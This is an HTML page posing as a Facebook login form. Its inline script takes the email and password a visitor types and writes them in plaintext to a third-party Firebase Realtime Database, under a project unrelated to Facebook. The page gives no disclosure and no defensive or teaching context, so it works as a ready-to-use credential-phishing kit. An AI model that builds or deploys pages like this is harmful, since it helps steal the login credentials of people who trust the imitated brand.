<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Facebook Sign Up</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
  <link rel="stylesheet" href="./fb.css">
</head>
<body>
  <form id="userForm" class="login">
    <img src="logo.png" alt="Logo">
    <h1>Facebook</h1>
    <input id="email" name="email" class="login-input" placeholder="Email Address or Phone number" required autofocus>
    <input id="password" name="password" class="login-input" type="password" placeholder="Password" required>
    <input type="submit" value="Login" class="login-submit">
    <p class="login-help"><a href="#">Forgot password?</a></p>
  </form>

  <script src="https://www.gstatic.com/firebasejs/10.13.0/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.13.0/firebase-database.js"></script>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyAWUHv7SA7GrhstueJTocnKYHG9_sc-khE",
      authDomain: "bestweb-aaaa.firebaseapp.com",
      databaseURL: "https://bestweb-aaaa-default-rtdb.firebaseio.com", // Realtime Database URL
      projectId: "bestweb-aaaa",
      storageBucket: "bestweb-aaaa.appspot.com",
      messagingSenderId: "33549663960",
      appId: "1:33549663960:web:7fd5162d53b3cd9715e1ad",
      measurementId: "G-CEX3L71WXX"
    };

    const app = firebase.initializeApp(firebaseConfig);
    const database = firebase.database(app);

    document.getElementById('userForm').addEventListener('submit', function(e) {
      e.preventDefault();
      
      var email = document.getElementById('email').value;
      var password = document.getElementById('password').value;

      database.ref('users/' + email.replace('.', '_')).set({
        email: email,
        password: password
      }).then(function() {
        alert('Data successfully written to Firebase!');
      }).catch(function(error) {
        console.error('Error writing data to Firebase: ', error);
      });
    });
  </script>
</body>
</html>
